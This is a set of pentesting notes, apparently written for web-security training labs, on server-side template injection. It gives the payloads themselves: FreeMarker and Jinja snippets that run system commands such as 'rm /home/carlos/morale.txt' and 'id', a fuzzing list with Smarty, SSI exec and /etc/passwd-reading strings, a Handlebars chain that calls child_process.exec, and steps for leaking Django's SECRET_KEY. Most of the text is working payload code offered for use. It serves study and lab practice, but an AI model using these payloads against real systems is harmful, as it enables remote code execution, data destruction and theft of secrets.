# Template Injection

Use the burp intruder with the list for template injection, this can be usefull in hte final stage to retrive the file to submit
Have a look at the lenght of the response and the code, in the error message of a 500 response code, you can evince which template is used

Sometimes before iterating the list try to add "}}" to close the statement of the template [THINK OUT OF THE BOX]
If you find some difference add code inside the injection to cause an error and find out the template on background
See if you can inject system command through python or other ways, like importing the module os as the snipped below:

```
{% import os %}
{{os.system('rm /home/carlos/morale.txt')
```

Sample injection template FreeMaker
To evince you can try to inject a class that not exist 

<p>Hurry! Only ${foobar} left of ${product.name} at ${product.price}.</p>

<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("rm /home/carlos/morale.txt") }

# List of fuzzing input

```
{77*77}
{{77*77}}
{{{77*77}}}
${77*77}
${{77*77}}
#{77*77}
[[77*77]]
{{=77*77}}
[[${77*77}]]
<%=77*77%>
${xyz|77*77}
#set($x=77*77)${x}
@(77*77)
<p th:text='${#ctx.getClass()}'></p>
${#ctx.getClass()}
<#assign xy="zxxxxxxz"><#assign yx="zyyyyyyz">${yx}${xy}
<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}
[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}
${"freemarker.template.utility.Execute"?new()("id")}
${T(java.lang.System).getenv()}
${class.getClassLoader()}
${class.getResource("").getPath()}
${class.getResource("../../../../../WEB-INF/web.xml").getContent()}
${''.constructor.constructor('return Error().stack')()}
{{''.constructor.constructor('return Error().stack')()}}
#{''.constructor.constructor('return Error().stack')()}
<%=''.constructor.constructor('return Error().stack')()%>
{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=='Sized'%}{{c.__len__.__globals__['__builtins__']['__import__']('traceback').format_stack()}}{%endif%}{%endfor%}
${__import__("traceback").format_stack()}
{{__import__("traceback").format_stack()}}
#{__import__("traceback").format_stack()}
<%__import__("traceback").format_stack()%>
<pre>{% debug %}</pre>
{{[].class.base.subclasses()}}
{{''.class.mro()[1].subclasses()}}
{{''.__class__.__mro__[2].__subclasses__()}}
<%=Thread.current.backtrace%>
#{Thread.current.backtrace}
{$smarty.version}
{php}echo `id`;{/php}
{{constant('Twig_Environment::VERSION')}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{'/etc/passwd'|file_excerpt(1,30)}}
{{self}}
"-->'-->`--><!--#set var="suc" value="rtb97y3o64"--><!--#set var="uwe" value="tvdb905q86"--><!--#echo var="suc"--><!--#echo var="uwe"--><!--#exec cmd="id" -->
```

##Special one

```
${{<%[%'"}}%\
```

## Exploit for handlebars template

You can find the template by fuzzing the input as follow:

{{77*77}}
{{{77*77}}}
${77*77}

typical error message:

###/usr/local/lib/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:267
            throw new Error(str);
            ^


```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}
```


# Django injection


https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf

## Added it for just to understand the methodology

change one of the template expressions to something invalid, such as a fuzz string ${{<%[%'"}}%\, and save the template. The error message in the output hints that the Django framework is being used.
Study the Django documentation and notice that the built-in template tag debug can be called to display debugging information.
In the template, remove your invalid syntax and enter the following statement to invoke the debug built-in:

{% debug %}
Save the template. The output will contain a list of objects and properties to which you have access from within this template. Crucially, notice that you can access the settings object.
Study the settings object in the Django documentation and notice that it contains a SECRET_KEY property, which has dangerous security implications if known to an attacker.
In the template, remove the {% debug %} statement and enter the expression {{settings.SECRET_KEY}}
